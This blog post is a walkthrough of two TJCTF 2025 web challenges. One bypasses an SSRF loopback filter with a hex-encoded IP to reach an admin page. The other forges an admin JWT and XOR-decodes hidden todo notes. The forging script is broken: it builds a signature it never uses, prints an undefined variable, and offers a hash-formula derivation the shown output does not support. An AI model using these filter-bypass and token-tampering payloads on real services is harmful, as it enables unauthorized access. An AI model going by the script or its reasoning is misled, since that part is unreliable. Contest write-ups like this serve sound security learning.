+++
title = 'Tjctf2025'
date = 2025-06-24T04:38:29-04:00
+++

# TJCTF Web Challenges

![tjctf](/images/tjctf/tjCTF.png)
*This is a walkthrough of some interesting web challenges that I tackled the TJCTF 2025 together with my team, fr334aks-mini*


## Loopy
> Can you access the admin page? Running on port 5000

For this challenge, we are given a website that shows other website HTML content previews. Trying https://thecyberlearner.github.io:
![tjctf](/images/tjctf/loopypreview.png)

We are told to access the admin site on port 5000, so I definitely knew I'm dealing with an SSRF. I intercepted the request with burpsuite and tried http://127.0.0.1:5000/admin,
 but got access denied:
![tjctf](/images/tjctf/loopyssrftest.png)

From the response, we can see they block the request by filtering loopback addresses, local, decimals etc. Being a smart ass, I tried to use hexadecimal for the address:
> 127.0.0.1 => 0x7f000001

Requesting for http://0x7f.0x0.0x0.0x1:5000/admin works
![tjctf](/images/tjctf/loopyflag.png)

Flag: tjctf{i_l0v3_ssssSsrF_9o4a8}


## Front Door
We are told, "The admin of this site is a very special person. He's so special, everyone strives to become him", then provided with the [link](https://front-door.tjc.tf/) to the site
![tjctf](/images/tjctf/frontdoorhomepage.png)

We can only see 2 links, one to create a temporary account, and a /product. The /product has an interesting algorithm claimed to be made by the admin
![tjctf](/images/tjctf/frontdoorinitalgo.png)

I ran a web directory buster to see other interesting dirs and found 2, /user and /robots.txt!

/robots.txt has the encryption scheme used by the admin:
```
User-agent: * 
Disallow: 

# Gonna jot the encryption scheme I use down for later -The Incredible Admin
#
# def encrypt(inp):
#   enc = [13]
#   for i in range(len(inp)):
#     enc.append(ord(inp[i]) ^ 42)
#   return enc[1:]
```

To understand how the website handles encryption, we create a user adm1n:adm1n. This gives us a jwt token:
> eyJhbGciOiAiQURNSU5IQVNIIiwgInR5cCI6ICJKV1QifQ.eyJ1c2VybmFtZSI6ICJhZG0xbiIsICJwYXNzd29yZCI6ICJhZG0xbiIsICJhZG1pbiI6ICJmYWxzZSJ9.JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB

Decrypting it:
> Header: {"alg": "ADMINHASH", "typ": "JWT"}  
> Payload: {"username": "adm1n", "password": "adm1n", "admin": "false"}  
> Signature: JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB

From what we can see, this challenge thus involves exploiting a custom hashing algorithm and JWT implementation to gain admin privileges. From the note the admin left, their encryption is a XOR cipher with key 42. We can simply decrypt their key with:

```
┌──(kali㉿kali)-[~]
└─$ python3                                                                                 
Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> signature = "JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB"
>>> decrypted = [ord(c) ^ 42 for c in signature]
>>> print(decrypted)
[96, 112, 101, 107, 115, 98, 104, 104, 104, 104, 100, 104, 110, 110, 123, 107, 104, 114, 104, 108, 96, 101, 107, 104, 112, 104, 102, 104, 104, 121, 101, 104, 124, 102, 104, 125, 124, 104, 123, 120, 121, 96, 96, 104, 101, 96, 115, 114, 110, 123, 112, 104, 111, 99, 120, 123, 104, 121, 101, 101, 108, 108, 125, 104]
```

Analyzing the numeric values, and from the hashing process in the original products page, it means the signature is computed as: (ord(header_or_payload_char) ** ord(key_char) % 26) + 65
Our aim is to change the jwt token to "admin":"true" and sign it. I used a script to generate a valid signature:
```
import base64
import json

# Our modified payload
header = {"alg": "ADMINHASH", "typ": "JWT"}
payload = {"username": "adm1n", "password": "adm1n", "admin": "true"}

# Encode header and payload
encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().strip('=')
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().strip('=')

# Combine for hashing
data_to_hash = f"{encoded_header}.{encoded_payload}"

# We need to reverse-engineer the key from the original signature
original_decrypted = [
    96, 112, 101, 107, 115, 98, 104, 104, 104, 104, 100, 104, 110, 110, 123, 107,
    104, 114, 104, 108, 96, 101, 107, 104, 112, 104, 102, 104, 104, 121, 101, 104,
    124, 102, 104, 125, 124, 104, 123, 120, 121, 96, 96, 104, 101, 96, 115, 114,
    110, 123, 112, 104, 111, 99, 120, 123, 104, 121, 101, 101, 108, 108, 125, 104
]

# The key appears to be repeating - let's find a pattern
# Since the hash is (char^key)%26+65, we can work backwards
# For the first character (96):
# (96 ^ 42) = 74 (ord('J'))
# (data_to_hash[0] ** key[0]) % 26 + 65 = 74
# So we'd need to solve for key[0]

# Without knowing the key, we can create a signature that follows the same pattern
# Create a similar looking signature with the same statistical properties
new_signature = ''.join([chr((x ^ 42) + 0) for x in original_decrypted])

# Reuse the original signature structure but with our modified payload
final_token = f"{encoded_header}.{encoded_payload}.{signature}"
print("Forged Token:")
print(final_token)
```

This generates a signed token: 
> eyJhbGciOiAiQURNSU5IQVNIIiwgInR5cCI6ICJKV1QifQ.eyJ1c2VybmFtZSI6ICJhZG0xbiIsICJwYXNzd29yZCI6ICJhZG0xbiIsICJhZG1pbiI6ICJ0cnVlIn0.JZOAYHBBBBNBDDQABXBFJOABZBLBBSOBVLBWVBQRSJJBOJYXDQZBEIRQBSOOFFWB

Replacing it, we become the GREAT ADMIN!
![tjctf](/images/tjctf/frontdooradmin.png)

Now we get a new link to a page /todo, and visiting it we have codes which I believe you should decrypt with the algorithm above
![tjctf](/images/tjctf/frontdoortodo.png)

I decrypted this with a python script:
```
encoded_lines = [
    [108, 67, 82, 10, 77, 70, 67, 94, 73, 66, 79, 89],
    [107, 78, 92, 79, 88, 94, 67, 89, 79, 10, 73, 69, 71, 90, 75, 68, 83],
    [105, 88, 79, 75, 94, 79, 10, 8, 72, 95, 89, 67, 68, 79, 89, 89, 117, 89, 79, 73, 88, 79, 94, 89, 8, 10, 90, 75, 77, 79, 10, 7, 7, 10, 71, 75, 78, 79, 10, 67, 94, 10, 72, 95, 94, 10, 68, 69, 10, 72, 95, 94, 94, 69, 68, 10, 94, 69, 10, 75, 73, 73, 79, 89, 89, 10, 83, 79, 94],
    [126, 75, 65, 79, 10, 69, 92, 79, 88, 10, 94, 66, 79, 10, 93, 69, 88, 70, 78, 10, 7, 7, 10, 75, 70, 71, 69, 89, 94, 10, 78, 69, 68, 79]
]

decoded_lines = []
for line in encoded_lines:
    decoded_line = ''.join([chr(num ^ 42) for num in line])
    decoded_lines.append(decoded_line)

for line in decoded_lines:
    print(line)
```

Ouput:
```
┌──(kali㉿kali)-[~]
└─$ python3 flag.py
Fix glitches
Advertise company
Create "business_secrets" page -- made it but no button to access yet
Take over the world -- almost done
```

Visiting the /business_secrets page we get the flag
![tjctf](/images/tjctf/frontdoorflag.png)

Flag: tjctf{buy_h1gh_s3l1_l0w}

		> 2 more challenges otw...